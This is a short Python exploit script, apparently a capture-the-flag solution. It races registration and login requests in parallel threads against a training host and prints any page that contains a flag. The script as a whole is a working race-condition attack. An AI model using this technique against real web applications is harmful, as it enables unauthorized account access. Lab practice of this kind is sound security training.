#! /usr/bin/python3
import requests
import random
import string
import threading
import time

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def randomuser(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(10))


def login(session, login_info):
    logged = session.post("http://meta.training.jinblack.it/login.php", data=login_info)
    #if "Completed" in logged.text:
    #    print("logged")
    flag_content = session.get("http://meta.training.jinblack.it")
    #print(flag_content.text)
    if "flag" in flag_content.text:
        print(flag_content.text)
    return logged.text


def register(session, reg_info):
    response = session.post("http://meta.training.jinblack.it/register.php", data=reg_info)
    #print(response.text)
    return response.text


def home(session, username):
    flag_content = session.get("http://meta.training.jinblack.it")
    #print(flag_content.text)
    if "flag" in flag_content.text:
        print(flag_content.text)


while True:
    session = requests.Session()
    username = randomuser()
    print(username)
    password = "password"
    login_info = {"username": username, "password": password, "log_user": ""}
    registration_info = {"username": username, "password_1": password, "password_2": password, "reg_user": ""}
    t1 = threading.Thread(target=register, args=(session, registration_info))
    t2 = threading.Thread(target=login, args=(session, login_info))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    time.sleep(0.1)
